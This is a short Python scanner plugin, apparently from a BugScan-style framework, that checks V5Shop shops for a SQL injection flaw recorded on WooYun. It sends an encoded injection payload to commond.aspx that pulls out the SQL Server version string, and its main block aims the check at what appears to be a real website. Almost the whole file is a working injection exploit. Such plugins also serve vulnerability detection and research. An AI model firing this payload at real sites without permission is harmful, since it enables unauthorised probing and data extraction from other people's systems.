#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '这个程序员不太冷'
#http://www.wooyun.org/bugs/wooyun-2013-043157 
import re

def assign(service, arg):
    if service == "v5shop":
        return True, arg

def audit(arg):
    path1='commond.aspx'
    payload1='?id=%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29'
    code, head, res, errcode, _ = curl.curl(arg + path1+payload1)
    if 'qbbzqMicrosoft SQL Server' in res:
            security_hole(arg+path1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('v5shop','http://ilikeulike.cn/')[1])
